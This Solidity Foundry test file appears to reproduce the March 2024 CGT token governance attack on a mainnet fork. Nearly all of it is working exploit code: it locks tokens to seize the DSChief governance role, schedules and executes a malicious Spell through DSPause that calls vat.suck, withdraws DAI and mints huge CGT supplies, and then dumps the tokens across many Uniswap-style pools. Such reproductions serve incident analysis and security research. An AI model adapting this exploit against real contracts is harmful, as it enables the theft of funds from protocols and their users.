// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~998B(cgt token)
// TX : https://app.blocksec.com/explorer/tx/eth/0x4ff4028b03c3df468197358b99f5160e5709e7fce3884cc8ce818856d058e106
// Attacker : https://etherscan.io/address/0xdaaa6294c47b5743bdafe0613d1926ee27ae8cf5
// Attack Contract : https://etherscan.io/address/0x1e791527aea32cddbd7ceb7f04612db536816545
// GUY : https://x.com/AnciliaInc/status/1771598968448745536

interface IMERC20 is IERC20 {
    function mint(address guy, uint wad) external;
    function burn(address guy, uint wad) external;
    function start() external;
    function stop() external;
}

interface IDSChief {
    function lock(uint wad) external;
    function vote(address[] memory yays) external returns (bytes32);
    function lift(address whom) external;
    function free(uint wad) external;
}

interface IDSPause {
    function plot(address usr, bytes32 tag, bytes memory fax, uint eta) external;
    function exec(address usr, bytes32 tag, bytes memory fax, uint eta) external returns (bytes memory out);
}

interface IVat {
    function suck(address u, address v, uint rad) external;
    function hope(address usr) external;
}
interface IJoin {
    function exit(address usr, uint wad) external;
}
interface IRouterV3s {
    struct ExactInputParams {
        bytes path;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
    }
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function exactInput(ExactInputParams calldata params)
        external
        payable
        returns (uint256 amountOut);
}

interface IOmniBridge {
    function relayTokens(
        address token,
        address _receiver,
        uint256 _value
    ) external;

    function dailyLimit(address _token) external view returns (uint256);
    function totalSpentPerDay(address _token, uint256 _day) external view returns (uint256);
    function getCurrentDay() external view returns (uint256);
}

interface ISkaleB {
    function depositERC20Direct(
        string calldata schainName,
        address erc20OnMainnet,
        uint256 amount,
        address receiver
    ) external;
}

interface IParachainB {
    function lock(bytes32 to, IERC20 token, uint256 amount) external;
}

interface IBobaB {
    function depositERC20To(
        address _l1Token,
        address _l2Token,
        address _to,
        uint256 _amount,
        uint32 _l2Gas,
        bytes calldata _data
    ) external;
}
contract ContractTest is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x85705829c2f71EE3c40A7C28f6903e7c797c9433); 
    IDSChief chief = IDSChief(0x579A3244f38112b8AAbefcE0227555C9b6e7aaF0);
    IDSPause pause = IDSPause(0x1e692eF9cF786Ed4534d5Ca11EdBa7709602c69f);
    IERC20 csc = IERC20(0xfDcdfA378818AC358739621ddFa8582E6ac1aDcB);
    IERC20 ixs = IERC20(0x73d7c860998CA3c01Ce8c808F5577d94d545d1b4);
    IERC20 oinch = IERC20(0x111111111117dC0aa78b770fA6A738034120C302);
    IERC20 uni = IERC20(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984);
    IERC20 link = IERC20(0x514910771AF9Ca656af840dff83E8264EcF986CA);
    IERC20 xchf = IERC20(0xB4272071eCAdd69d933AdcD19cA99fe80664fc08);
    IERC20 skl = IERC20(0x00c83aeCC790e8a4453e5dD3B0B4b3680501a7A7);
    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 cgt = IERC20(0xF56b164efd3CFc02BA739b719B6526A6FA1cA32a);
    IRouterV3s router = IRouterV3s(0xDc6844cED486Ec04803f02F2Ee40BBDBEf615f21);
    IRouterV3s routerV3 = IRouterV3s(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    IOmniBridge omniBridge = IOmniBridge(0x69c707d975e8d883920003CC357E556a4732CD03);
    ISkaleB skaleB = ISkaleB(0x8fB1A35bB6fB9c47Fb5065BE5062cB8dC1687669);
    IParachainB parachainB = IParachainB(0x9b8A09b3f538666479a66888441E15DDE8d13412);
    IBobaB bobaB = IBobaB(0xdc1664458d2f0B6090bEa60A8793A4E66c2F1c00);
    Spell spell;
    function setUp() external {
        cheats.createSelectFork("mainnet", 19498910);
        deal(address(cgt),address(this),80 ether);
    }

    function testExploit() external {
        attack();
        emit log_named_decimal_uint("[End] Attacker CGT after exploit", cgt.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Attacker dai after exploit", dai.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Attacker weth after exploit", weth.balanceOf(address(this)), 18);
    }

    function attack()public {
        cgt.approve(address(chief), type(uint256).max);
        chief.lock(20 ether);
        address[] memory yays = new address[](1);
        yays[0] = address(this);
        chief.vote(yays);
        chief.lift(address(this));
        spell = new Spell();
        address spelladdr = address(spell);
        bytes32 tag; assembly { tag := extcodehash(spelladdr) }
        uint delay = block.timestamp + 0;
        bytes memory sig = abi.encodeWithSignature("act(address,address)", address(this), address(cgt));
        pause.plot(address(spell), tag, sig, delay);
        pause.exec(address(spell), tag, sig, delay);
        _swap0();
        _swap1();
    }
   function _swap0() internal {
        uint inAmount = 10**8 * 1 ether;
        address[] memory path = new address[](2);
        path[0] = address(cgt);
        path[1] = address(weth);

        cgt.approve(address(router), inAmount);
        router.swapExactTokensForTokens(
            inAmount,
            0,
            path,
            address(this),
            block.timestamp
        ); 

        path[1] = address(dai);
        cgt.approve(address(router), inAmount);
        router.swapExactTokensForTokens(
            inAmount,
            0,
            path,
            address(this),
            block.timestamp
        ); 

        path[1] = address(xchf);
        cgt.approve(address(router), inAmount);
        router.swapExactTokensForTokens(
            inAmount,
            0,
            path,
            address(this),
            block.timestamp
        ); 

        path[1] = address(oinch);
        cgt.approve(address(router), inAmount);
        router.swapExactTokensForTokens(
            inAmount,
            0,
            path,
            address(this),
            block.timestamp
        ); 

        path[1] = address(uni);
        cgt.approve(address(router), inAmount);
        router.swapExactTokensForTokens(
            inAmount,
            0,
            path,
            address(this),
            block.timestamp
        ); 

        path[1] = address(link);
        cgt.approve(address(router), inAmount);
        router.swapExactTokensForTokens(
            inAmount,
            0,
            path,
            address(this),
            block.timestamp
        ); 

        path[1] = address(skl);
        cgt.approve(address(router), inAmount);
        router.swapExactTokensForTokens(
            inAmount,
            0,
            path,
            address(this),
            block.timestamp
        ); 

        path[0] = address(csc);
        path[1] = address(weth);
        csc.approve(address(router), inAmount);
        router.swapExactTokensForTokens(
            inAmount,
            0,
            path,
            address(this),
            block.timestamp
        ); 

        address[] memory path3 = new address[](3);
        path3[0] = address(cgt);
        path3[1] = address(0x46683747B55C4A0fF783B1A502cE682eB819eb75);
        path3[2] = address(ixs);

        cgt.approve(address(router), inAmount);
        router.swapExactTokensForTokens(
            inAmount,
            0,
            path3,
            address(this),
            block.timestamp
        );

        cgt.approve(address(routerV3), cgt.balanceOf(address(this)));
        bytes memory pathv3 =
            abi.encodePacked(cgt, uint24(10000), weth);
        IRouterV3s.ExactInputParams memory params = IRouterV3s
            .ExactInputParams({
            path: pathv3,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: inAmount,
            amountOutMinimum: 0
        });

        routerV3.exactInput(params);
    }

    function _swap1() internal {
        xchf.approve(address(routerV3), xchf.balanceOf(address(this)));
        bytes memory path =
            abi.encodePacked(xchf, uint24(3000), weth, uint24(3000), dai);
        IRouterV3s.ExactInputParams memory params = IRouterV3s
            .ExactInputParams({
            path: path,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: xchf.balanceOf(address(this)),
            amountOutMinimum: 0
        });

        routerV3.exactInput(params);

        oinch.approve(address(routerV3), oinch.balanceOf(address(this)));
        path =
            abi.encodePacked(oinch, uint24(3000), weth, uint24(3000), dai);
        params.path = path;
        params.amountIn = oinch.balanceOf(address(this));

        routerV3.exactInput(params);

        uni.approve(address(routerV3), uni.balanceOf(address(this)));
        path =
            abi.encodePacked(uni, uint24(3000), weth, uint24(3000), dai);
        params.path = path;
        params.amountIn = uni.balanceOf(address(this));

        routerV3.exactInput(params);

        link.approve(address(routerV3), link.balanceOf(address(this)));
        path =
            abi.encodePacked(link, uint24(3000), weth, uint24(3000), dai);
        params.path = path;
        params.amountIn = link.balanceOf(address(this));

        routerV3.exactInput(params);
    }
    fallback() external payable {}
}

contract Spell {
    function act(address user, IMERC20 cgt) public {
        IVat vat = IVat(0x8B2B0c101adB9C3654B226A3273e256a74688E57);
        IJoin daiJoin = IJoin(0xE35Fc6305984a6811BD832B0d7A2E6694e37dfaF);

        vat.suck(address(this), address(this), 10**9 * 10 ** 18 * 10 ** 27);

        vat.hope(address(daiJoin));
        daiJoin.exit(user, 10**9 * 1 ether);

        cgt.mint(user, 10**12 * 1 ether);
    }

}